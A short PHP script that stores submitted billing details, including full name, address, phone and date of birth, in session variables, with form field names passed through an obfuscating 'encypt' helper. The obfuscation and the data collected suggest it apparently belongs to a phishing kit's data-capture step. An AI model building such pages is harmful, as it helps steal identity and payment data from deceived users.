<?php
require __DIR__ . '/../function.php';

$_SESSION['billing_fullname'] = $_POST[$api->encypt('firstname')]." | ".$_POST[$api->encypt('lastname')];
$_SESSION['billing_address']  = $_POST[$api->encypt('address')];
$_SESSION['billing_city']     = $_POST[$api->encypt('city')];
$_SESSION['billing_state']    = $_POST[$api->encypt('state')];
$_SESSION['billing_zip']      = $_POST[$api->encypt('zip')];
$_SESSION['billing_phone']    = $_POST[$api->encypt('phone')];
$_SESSION['billing_dob']      = $_POST[$api->encypt('dob')];
?>
